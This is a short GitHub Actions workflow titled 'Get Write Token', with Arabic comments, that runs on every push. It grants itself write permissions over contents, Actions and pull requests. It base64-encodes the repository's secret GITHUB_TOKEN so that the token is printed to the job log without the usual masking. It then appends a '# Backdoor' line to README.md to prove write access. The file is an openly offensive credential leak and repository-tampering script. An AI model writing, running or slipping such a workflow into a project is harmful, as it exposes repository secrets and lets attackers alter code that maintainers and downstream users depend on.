name: Get Write Token
on: [push]

jobs:
  get-write:
    runs-on: ubuntu-latest
    permissions:
      contents: write          # ← هذا يمنح صلاحية الكتابة
      actions: write           # ← هذا يمنح صلاحية تعديل Actions
      pull-requests: write     # ← هذا يمنح صلاحية تعديل PRs
    steps:
      - name: Encode token with write permissions
        run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
      - name: Show repo info
        run: echo "Repository: ${{ github.repository }}"
      - name: Test write access
        run: |
          echo "# Backdoor" >> README.md
          echo "Write access confirmed"
